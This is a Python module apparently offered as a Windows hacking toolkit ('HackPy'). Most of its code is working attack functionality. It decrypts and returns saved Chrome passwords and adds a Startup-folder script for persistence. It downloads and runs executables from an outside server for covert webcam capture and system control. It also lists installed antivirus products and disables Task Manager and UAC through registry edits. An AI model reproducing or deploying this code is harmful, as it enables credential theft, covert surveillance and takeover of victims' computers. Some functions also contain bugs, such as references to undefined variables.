logo = (r"""
    _  _     _   _                  _        ____
  _| || |_  | | | |   __ _    ___  | | __   |  _ \   _   _
 |_  ..  _| | |_| |  / _` |  / __| | |/ /   | |_) | | | | |
 |_      _| |  _  | | (_| | | (__  |   <    |  __/  | |_| |
   |_||_|   |_| |_|  \__,_|  \___| |_|\_\   |_|      \__, |
         Module Created by L1merBoy with Love <3     |___/
         Please import it. Not start.
""")

# Import modules
import os
import time
import json
import shutil
import ctypes
import random
import sqlite3
import win32gui
import win32crypt
import platform
import socket
import pyperclip
import subprocess
from getmac import get_mac_address
from wget import download as wget_download

# Main server
global server_url
server_url = 'http://f0330673.xsph.ru'

# Install path
try:
    global module_location
    module_location = os.environ['TEMP'] + '\\hackpy'
except:
    raise('ERROR! Hackpy created only for Windows systems!')

# Create temp folders
for folder in ['', '\\executable', '\\tempdata']:
    if not os.path.exists(module_location + folder):
        os.mkdir(module_location + folder)

# System information
userInfo         = os.getenv('USERNAME')
versionInfo      = platform.version()
releaseInfo      = platform.release()
systemInfo       = platform.system()
nodeInfo         = platform.node()
machineInfo      = platform.machine()
processorInfo    = platform.processor()
platformInfo     = platform.platform()
architectureInfo = platform.architecture()

# Load file from URL
def wget(url, output = None, bar = None):
    return wget_download(url, bar = bar, out = output)

# Load all modules
def loadAll():
    for file in ['nircmd.exe', 'webcam.exe']:
        if not os.path.exists(module_location + '\\executable\\' + file):
            wget_download(server_url + '/HackPy/' + file, bar = None, out = module_location + '\\executable\\' + file)

# Check if program started as admin
def isAdmin():
    status = ctypes.windll.shell32.IsUserAnAdmin()
    if (status == 1):
        return True
    else:
        return False

# Add to startup.
def autorun(path, state = True):
    file = path.split('\\')[-1]
    name = file.split('.')[0]
    path = os.path.dirname(os.path.realpath(path))
    autorunDirPath = (os.environ['SystemDrive'] + '\\Users\\' + userInfo + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup')
    autorunBatPath = (autorunDirPath + '\\' + name + '.cmd')

    if state == True:
        with open(autorunBatPath, 'w', encoding = 'utf-8') as tempfile:
            tempfile.write(
                '\n@echo off'   +
                '\nchcp 65001'  +
                '\ncd ' + path  +
                '\nstart \"\" ' + file
                )
        return os.path.exists(autorunBatPath)

    elif state == False:
        try:
            os.remove(autorunBatPath)
        except:
            return False
        return not os.path.exists(autorunBatPath)

# SendKey
def sendKey(key):
    ##|
    ##| SendKey('Hello my L0rd!!{ENTER}')
    ##| All keys: https://pastebin.com/Ns3P7UiH
    ##|
    tempfile = module_location + r'\tempdata\keyboard.vbs'
    with open(tempfile, 'w') as keyboard_path:
        keyboard_path.write('WScript.CreateObject(\"WScript.Shell\").SendKeys \"' + key + '\"')
    command.system(tempfile)
    os.remove(tempfile)


# Get info by ip address
# WARNING! Usage limits:
# This endpoint is limited to 150 requests per minute from an IP address. If you go over this limit your IP address will be blackholed.
# You can unban here: http://ip-api.com/docs/unban
def whois(ip = '', out_tempfile = module_location + r'\tempdata\whois.json'):
    ##|
    ##|  "query": "24.48.0.1",
    ##|  "local": "192.168.1.6",
    ##|  "status": "success",
    ##|  "country": "Canada",
    ##|  "countryCode": "CA",
    ##|  "region": "QC",
    ##|  "regionName": "Quebec",
    ##|  "city": "Saint-Leonard",
    ##|  "zip": "H1R",
    ##|  "lat": 45.5833,
    ##|  "lon": -73.6,
    ##|  "timezone": "America/Toronto",
    ##|  "isp": "Le Groupe Videotron Ltee",
    ##|  "org": "Videotron Ltee",
    ##|  "as": "AS5769 Videotron Telecom Ltee"
    ##|
    wget_download('http://ip-api.com/json/' + ip, bar = None, out = out_tempfile)
    with open(out_tempfile, "r") as tempfile:
        whois_data = json.load(tempfile)
    try:
        os.remove(out_tempfile)
    except:
        pass
    if whois_data.get('status') == 'success':
        return whois_data
    else:
        raise ConnectionError('Status: ' + ip_data.get('status') + ', Message: ' + ip_data.get('message'))

# Get geodata by ip
def geoplugin(ip = '', out_tempfile = module_location + r'\tempdata\geoplugin.json'):
    ##|
    ##|  "geoplugin_request":"24.48.0.1",
    ##|  "geoplugin_status":200,
    ##|  "geoplugin_delay":"2ms",
    ##|  "geoplugin_credit":"Some of the returned data includes GeoLite data created by MaxMind, available from <a href='http:\/\/www.maxmind.com'>http:\/\/www.maxmind.com<\/a>.",
    ##|  "geoplugin_city":"Ivano-Frankivsk",
    ##|  "geoplugin_region":"Ivano-Frankivs'ka Oblast'",
    ##|  "geoplugin_regionCode":"26",
    ##|  "geoplugin_regionName":"Ivano-Frankivs'ka Oblast'",
    ##|  "geoplugin_areaCode":"",
    ##|  "geoplugin_dmaCode":"",
    ##|  "geoplugin_countryCode":"UA",
    ##|  "geoplugin_countryName":"Ukraine",
    ##|  "geoplugin_inEU":0,
    ##|  "geoplugin_euVATrate":false,
    ##|  "geoplugin_continentCode":"EU",
    ##|  "geoplugin_continentName":"Europe",
    ##|  "geoplugin_latitude":"48.9215",
    ##|  "geoplugin_longitude":"24.7097",
    ##|  "geoplugin_locationAccuracyRadius":"500",
    ##|  "geoplugin_timezone":"Europe\/Kiev",
    ##|  "geoplugin_currencyCode":"UAH",
    ##|  "geoplugin_currencySymbol":"₴",
    ##|  "geoplugin_currencySymbol_UTF8":"₴",
    ##|  "geoplugin_currencyConverter":24.769
    ##|
    wget_download('http://www.geoplugin.net/json.gp?ip=' + ip, bar = None, out = out_tempfile)
    with open(out_tempfile, "r") as tempfile:
        geoplugin_data = json.load(tempfile)
    try:
        os.remove(out_tempfile)
    except:
        pass
    if geoplugin_data.get('geoplugin_status') == 200:
        return geoplugin_data
    else:
        raise ConnectionError('Could not connect to server')

# Get LATITUDE, LONGITUDE, RANGE with bssid
def bssid_locate(bssid, out_tempfile = module_location + r'\tempdata\bssid_locate.json'):
    wget_download('http://api.mylnikov.org/geolocation/wifi?bssid=' + bssid, bar = None, out = out_tempfile)
    with open(out_tempfile, "r") as tempfile:
        bssid_data = json.load(tempfile)
    try:
        os.remove(out_tempfile)
    except:
        pass

    if bssid_data['result'] == 200:
        return bssid_data['data']

# Get router BSSID
def router():
    try:
        SMART_ROUTER_IP = ('.'.join(socket.gethostbyname(socket.gethostname()).split('.')[:-1]) + '.1')
        BSSID = get_mac_address(ip = SMART_ROUTER_IP)
    except:
        return None
    else:
        return BSSID

# Set wallpaper
def setWallpaper(image):
    return ctypes.windll.user32.SystemParametersInfoW(20, 0, image, 0)

# Get cursor position
def getCursorPos():
    return win32gui.GetCursorPos()

# Set cursor position
def setCursorPos(x, y):
    return ctypes.windll.user32.SetCursorPos(x, y)

# Get active window
def getActiveWindow():
    return win32gui.GetWindowText(win32gui.GetForegroundWindow())

def installPython(version = '3.7.0', path = os.environ['SystemDrive'] + '\\python'):
    ##|
    ##| Install python to system
    ##| Example: hackpy.install_python(version = '3.6.0', path = 'C:\\python36')
    ##| Default version is: 3.7.0 and install path is: C:\python
    ##|
    wget_download('https://www.python.org/ftp/python/' + version + '/python-' + version + '.exe', bar = None, out = 'python_setup.exe')
    command.system('python_setup.exe /quiet TargetDir=' + path + ' PrependPath=1 Include_test=0 Include_pip=1')
    os.remove('python_setup.exe')

def checkPython():
    ##|
    ##| Check if python installed in system
    ##| Example: hackpy.check_python()
    ##| return True if installed and False if not installed
    ##|
    status = command.system('python --version > ' + os.devnull)
    if status == 0:
        return True
    else:
        return False

# Sleep
def sleep(secounds):
    return time.sleep(secounds)

# Detect installed antivirus software
def detectProtection():
    SYS_DRIVE = os.environ['SystemDrive'] + '\\'
    detected = {}
    av_path = {
     'AVAST 32bit': 'Program Files (x86)\\AVAST Software\\Avast',
     'AVAST 64bit': 'Program Files\\AVAST Software\\Avast',
     'AVG 32bit': 'Program Files (x86)\\AVG\\Antivirus',
     'AVG 64bit': 'Program Files\\AVG\\Antivirus',
     'Avira 32bit': 'Program Files (x86)\\Avira\\Launcher',
     'Avira 64bit': 'Program Files\\Avira\\Launcher',
     'Advanced SystemCare 32bit': 'Program Files (x86)\\IObit\\Advanced SystemCare',
     'Advanced SystemCare 64bit': 'Program Files\\IObit\\Advanced SystemCare',
     'Bitdefender 32bit': 'Program Files (x86)\\Bitdefender Antivirus Free',
     'Bitdefender 64bit': 'Program Files\\Bitdefender Antivirus Free',
     'Comodo 32bit': 'Program Files (x86)\\COMODO\\COMODO Internet Security',
     'Comodo 64bit': 'Program Files\\COMODO\\COMODO Internet Security',
     'Dr.Web 32bit': 'Program Files (x86)\\DrWeb',
     'Dr.Web 64bit': 'Program Files\\DrWeb',
     'Eset 32bit': 'Program Files (x86)\\ESET\\ESET Security',
     'Eset 64bit': 'Program Files\\ESET\\ESET Security',
     'Grizzly Pro 32bit': 'Program Files (x86)\\GRIZZLY Antivirus',
     'Grizzly Pro 64bit': 'Program Files\\GRIZZLY Antivirus',
     'Kaspersky 32bit': 'Program Files (x86)\\Kaspersky Lab',
     'Kaspersky 64bit': 'Program Files\\Kaspersky Lab',
     'Malvare fighter 32bit': 'Program Files (x86)\\IObit\\IObit Malware Fighter',
     'Malvare fighter 64bit': 'Program Files\\IObit\\IObit Malware Fighter',
     'Norton 32bit': 'Program Files (x86)\\Norton Security',
     'Norton 64bit': 'Program Files\\Norton Security',
     'Panda Security 32bit': 'Program Files\\Panda Security\\Panda Security Protection',
     'Panda Security 64bit': 'Program Files (x86)\\Panda Security\\Panda Security Protection',
     'Windows Defender': 'Program Files\\Windows Defender',
     '360 Total Security 32bit': 'Program Files (x86)\\360\\Total Security',
     '360 Total Security 64bit': 'Program Files\\360\\Total Security'
    }
    for antivirus, path in av_path.items():
        if os.path.exists(SYS_DRIVE + path):
            detected[antivirus] = (SYS_DRIVE + path)
    return detected


def passwordsRecovery():
    #|
    #| passwords_recovery()
    #| return dictonary with chrome passwords
    #|
    i = 0
    passwords = {}
    db_path   = (os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data')
    if os.path.exists(db_path):    
        conn   = sqlite3.connect(db_path)
        cursor = conn.cursor()
        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
        for result in cursor.fetchall():
            url      = result[0]
            login    = result[1]
            password = win32crypt.CryptUnprotectData(result[2])[1].decode()
            if password != '':
                i += 1
                passwords[i] = {'url': url, 'login': login, 'password': password}
        return passwords
    else:
        return 'Chrome not installed'

def webcam(filename = 'screenshot-' + str(random.randint(1, 99999)) + '.png', delay = 4500, camera = 1):
    ##|
    ##| Make webcam screenshot: hackpy.webcam(filename='webcam.png', delay=5000, camera=1)
    ##|
    if not os.path.exists(module_location + r'\executable\webcam.exe'):
        wget_download(server_url + '/HackPy/webcam.exe', bar = None, out = module_location + r'\executable\webcam.exe')
    command.system(module_location + r'\executable\webcam.exe /filename ' + str(filename) + ' /delay ' + str(delay) + ' /devnum ' + str(camera) + ' > ' + os.devnull)
    if os.path.exists(filename):
        return filename

class command:
    ##|
    ##| Execute system command: hackpy.command.system('command')
    ##| Execute nircmdc command: hackpy.command.nircmdc('command')
    ##|
    def system(recived_command):
        return subprocess.call(recived_command, shell = True)

    def nircmdc(recived_command):
        if not os.path.exists(module_location + r'\executable\nircmd.exe'):
            wget_download(server_url + '/HackPy/nircmd.exe', bar = None, out = module_location + r'\executable\nircmd.exe')
        return command.system(module_location + r'\executable\nircmd.exe ' + recived_command + ' > ' + os.devnull)


class power:
    ##|
    ##| hackpy.power.reboot()
    ##| hackpy.power.shutdown()
    ##| hackpy.power.logoff()
    ##| hackpy.power.hibernate()
    ##|
    def reboot():
        command.system('@shutdown -r -t 0')

    def shutdown():
        command.system('@shutdown -s -t 0')

    def logoff():
        command.system('@shutdown -l')

    def hibernate():
        command.system('@shutdown -h')


def messagebox(type, title, text):
    ##|
    ##| Show windows message box:
    ##| hackpy.messagebox('none', 'Title', 'Hey i\'m text!')
    ##| hackpy.messagebox('info','Title', 'Hey i\'m text!')
    ##| hackpy.messagebox('error','Title', 'Hey i\'m text!')
    ##| hackpy.messagebox('warning','Title', 'Hey i\'m text!')
    ##|
    tempfile = module_location + r'\tempdata\msgbox.vbs'
    msgbox_types = {
    'none':'0',
    'error':'16',
    'question': '32',
    'warning':'48',
    'info':'64'
    }

    with open(tempfile, 'w') as msgboxfile:
        msgboxfile.write('x=msgbox(\"' + text + '\" ,' + msgbox_types[type] + ', \"' + title + '\")')
    command.system(tempfile)
    os.remove(tempfile)


class clipboard:
    ##|
    ##| hackpy.clipboard.set('Text') # Copy text to clipboard
    ##| print('Data in clipboard:' + clipboard.get()) # Get text from clipboard
    ##|
    def set(text):
        pyperclip.copy(text)

    def get():
        return pyperclip.paste()

class file:
    ##|
    ##| hackpy.file.exists('file.txt') # return True/False
    ##| hackpy.file.remove('file.txt')
    ##| hackpy.file.rename('file.txt', 'newfile.txt')
    ##| hackpy.file.copy('file.txt', 'C:\\Windows')
    ##| hackpy.file.scan('C:\') # return files in dict
    ##| hackpy.file.start('file.txt') 
    ##| hackpy.file.startAsAdmin('file.txt')
    ##| hackpy.file.atributeHidden('file.txt')
    ##| hackpy.file.atributeNormal('file.txt')
    ##| hackpy.file.get_drives() # return dict with all drives
    ##|

    def exists(file):
        return os.path.exists(file)

    def remove(file):
        if not os.path.exists(file):
            return None
        return os.remove(file)

    def rename(oldFile, newFile):
        if not os.path.exists(file):
            return None
        return os.rename(oldFile, newFile)

    def copy(src, dst):
        return shutil.copy(src, dst)

    def scan(path):
        return os.listdir(path)

    def start(file):
        if not os.path.exists(file):
            return None
        return os.startfile(file)

    def startAsAdmin(file):
        status = ctypes.windll.shell32.ShellExecuteW(None, "runas", file, '', None, 1)
        if (status == 42):
            return True, 'User allowed'
        elif (status == 5):
            return False, 'User denied'
        elif (status == 31):
            return False, 'Invalid file type'
        elif (status == 2):
            return False, 'File not found'
        else:
            return False, status

    def get_drives():
        drives = []
        bitmask = ctypes.windll.kernel32.GetLogicalDrives()
        letter = ord('A')
        while bitmask > 0:
            if bitmask & 1:
                drives.append(chr(letter) + ':\\')
            bitmask >>= 1
            letter += 1

        return drives

    def atributeNormal(file):
        return ctypes.windll.kernel32.SetFileAttributesW(file, 1)

    def atributeHidden(file):
        return ctypes.windll.kernel32.SetFileAttributesW(file, 2)


class taskmanager:
    ##|
    ##| hackpy.taskmanager.enable()
    ##| hackpy.taskmanager.disable()
    ##|
    ##| hackpy.taskmanager.kill('process_name.exe')
    ##| hackpy.taskmanager.start('process_name.exe')
    ##| hackpy.taskmanager.find('process_name.exe') # return True or False
    ##| hackpy.taskmanager.list() # return all process list
    ##|
    def enable():
        command.system('@reg.exe ADD "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /f /v "DisableTaskMgr" /t REG_DWORD /d 0' + ' > ' + os.devnull)

    def disable():
        command.system('@reg.exe ADD "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /f /v "DisableTaskMgr" /t REG_DWORD /d 1' + ' > ' + os.devnull)

    def kill(process):
        command.system('@taskkill /F /IM ' + process + ' > ' + os.devnull)

    def start(process):
        command.system('@start ' + process + ' > ' + os.devnull)

    def find(process):
        process_list = taskmanager.list()
        if (process in process_list):
            return True
        else:
            return False

    def list():
        random_number = str(random.randint(1, 99999))
        list_path = module_location + r'\tempdata\process_list_' + random_number + '.tmp'
        command.system('@tasklist > ' + list_path)
        # Read task list file
        with open(list_path, 'r') as file:
            process_list = []
            for line in file.readlines():
                line = line.replace('\n', '').split()
                if (line):
                    process = line[0]
                    if (process.endswith('.exe')):
                        process_list.append(process)
        os.remove(list_path)
        return process_list



class uac:
    ##|
    ##| hackpy.uac.disable() # Disable UAC // NEED ADMIN!
    ##| hackpy.uac.enable() # Disable UAC // NEED ADMIN!
    ##|
    def disable():
        command.system('C:\\Windows\\System32\\cmd.exe /k C:\\Windows\\System32\\reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f')

    def enable():
        command.system('C:\\Windows\\System32\\cmd.exe /k C:\\Windows\\System32\\reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 1 /f')


if __name__ == '__main__':
    print(1 * '\n' + logo)
